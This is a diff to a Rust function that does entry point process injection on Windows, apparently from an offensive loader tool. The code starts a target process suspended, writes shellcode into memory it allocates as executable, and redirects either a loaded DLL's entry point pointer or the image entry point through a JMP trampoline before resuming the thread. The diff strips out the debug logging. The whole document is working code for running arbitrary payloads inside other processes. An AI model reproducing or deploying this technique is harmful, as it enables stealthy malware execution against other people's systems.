@@ -3,20 +3,11 @@ use crate::api::{PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 
 #[cfg(feature = "run_entry_point_injection")]
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Starting Entry Point Injection (EPI)...");
-
     // 1. Create Process in Suspended State
     let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
 
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Process created. PID: {}", process_info.dwProcessId));
-
     // 2. Allocate Memory for Shellcode
     let remote_mem = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
-    
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Allocated memory at: {:#x}", remote_mem));
 
     // 3. Write Shellcode
     let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
@@ -38,8 +29,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     }
 
     let peb_base = pbi.PebBaseAddress as usize;
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("PEB Base: {:#x}", peb_base));
 
     // 5. Walk Ldr to find a DLL (kernelbase.dll or ntdll.dll)
     // Note: In a suspended process created via CreateProcess, Ldr might not be fully initialized.
@@ -85,15 +74,10 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
                 crate::api::read_virtual_memory(process_info.hProcess, base_dll_name_ptr, &mut name_buf)?;
                 let name = String::from_utf16_lossy(unsafe { std::slice::from_raw_parts(name_buf.as_ptr() as *const u16, base_dll_name_len as usize / 2) });
                 
-                #[cfg(feature = "debug")]
-                crate::utils::print_message(&format!("Found module: {}", name));
-
                 if name.to_lowercase().contains("kernelbase.dll") || name.to_lowercase().contains("ntdll.dll") {
                     // Found target DLL
                     target_entry_point_addr = current_entry + 0x38;
                     found_dll = true;
-                    #[cfg(feature = "debug")]
-                    crate::utils::print_message(&format!("Targeting DLL: {}", name));
                     break;
                 }
             }
@@ -106,8 +90,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     }
 
     if !found_dll {
-        #[cfg(feature = "debug")]
-        crate::utils::print_message("Could not find suitable DLL in Ldr. Fallback to Image EntryPoint.");
         
         // Fallback: Get ImageBase and parse PE header
         // PEB.ImageBaseAddress is at offset 0x10 (x64)
@@ -146,9 +128,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
         // Better: Write a JMP to our shellcode at the EntryPoint.
         // JMP [RIP+0] -> 0xFF 0x25 0x00 0x00 0x00 0x00 + Address (14 bytes)
         
-        #[cfg(feature = "debug")]
-        crate::utils::print_message(&format!("Patching Image EntryPoint at: {:#x}", entry_point_addr));
-        
         crate::api::protect_virtual_memory(process_info.hProcess, entry_point_addr, 16, PAGE_EXECUTE_READWRITE)?;
         
         let mut trampoline = vec![
@@ -164,18 +143,12 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
         // This is the pointer in the struct, not the code itself.
         // So we just write our shellcode address to this pointer.
         
-        #[cfg(feature = "debug")]
-        crate::utils::print_message(&format!("Overwriting LDR EntryPoint pointer at: {:#x}", target_entry_point_addr));
-        
         // LDR data is usually RW.
         crate::api::write_virtual_memory(process_info.hProcess, target_entry_point_addr, &remote_mem.to_le_bytes())?;
     }
 
     // 7. Resume Thread
     crate::api::resume_thread(process_info.hThread)?;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Injection completed.");
 
     Ok(())
 }
